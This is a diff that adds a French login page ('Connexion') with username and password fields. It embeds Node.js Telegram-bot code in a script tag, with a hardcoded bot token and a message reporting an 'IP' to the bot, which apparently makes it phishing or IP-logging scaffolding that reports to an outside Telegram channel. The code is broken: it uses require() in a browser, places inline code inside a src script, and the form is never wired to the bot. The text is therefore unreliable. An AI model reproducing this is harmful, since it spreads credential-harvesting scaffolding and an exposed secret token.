@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Connexion</title>
+ <link rel="stylesheet" type="text/css" href="style.css">
+ <script src="script.js">
+ const BotApi = require('telegram-bot-api');
+const bot = new BotApi({
+  token: '7130866739:AAHzCDivxW7B6znphCcxAuw3k6oJkbpx9YI',
+  polling: true,
+  startPolling: true,
+});
+bot.onText(/start/, (text, user) => {
+  const ip = 'IP_ADDRESS_HERE';
+  bot.sendMessage(user, 'IP : ' + ip);
+});</script>
+</head>
+<body>
+ <div class="container">
+  <h1>Connexion</h1>
+  <form>
+   <label for="username">Nom d'utilisateur:</label>
+   <input type="text" id="username" name="username"><br><br>
+   <label for="password">Mot de passe:</label>
+   <input type="password" id="password" name="password"><br><br>
+   <button type="submit">Connexion</button>
+  </form>
+ </div>
+</body>
+</html>
